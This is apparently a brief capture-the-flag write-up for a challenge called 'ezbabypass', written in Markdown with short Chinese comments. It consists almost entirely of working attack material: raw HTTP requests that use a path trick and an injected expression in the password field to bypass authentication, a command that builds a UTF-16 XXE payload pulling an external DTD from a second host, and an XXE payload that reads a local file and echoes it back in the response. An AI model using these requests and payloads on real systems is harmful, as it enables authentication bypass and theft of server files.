---
tags: [XXE, 任意文件读取, SOAP, XML]
---

# ezbabypass

```
POST /index;.ico?password HTTP/1.1
Host: 94.74.86.95:8899
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like
Gecko) Chrome/102.0.5005.63 Safari/537.36
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,
*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 157

password=${("a").replace(97,39)}=${("a").replace(97,39)}&poc=IURPQ1RZUEU=&type=string&y
ourclasses=DemoController,DemoController,DemoController,DemoController
```

使用下面命令生成poc，需要把文件头0xFEFF删掉

```
echo '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE cdl [<!ENTITY % asd SYSTEM "http://101.35.219.93:8082/xxe.dtd">%asd;%c;]>
<cdl>&rrr;</cdl> ' | iconv -f UTF-8 -t UTF-16 >a.xml
```

```
POST /index;.ico?password HTTP/1.1
Host: 94.74.86.95:8899
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like
Gecko) Chrome/103.0.5060.134 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 1056

password=${("a").replace(97,39)}=${("a").replace(97,39)}&poc=base64_poc&type=string2&yo
urclasses=java.io.ByteArrayInputStream,[B,org.xml.sax.InputSource,java.io.InputStream
```

目标不出网，利用返回值回显文件内容

```
<?xml version="1.0" encoding="utf-16"?>
<!DOCTYPE root [
<!ENTITY file SYSTEM "file:///flag">
]>
<root>&file;</root>
```

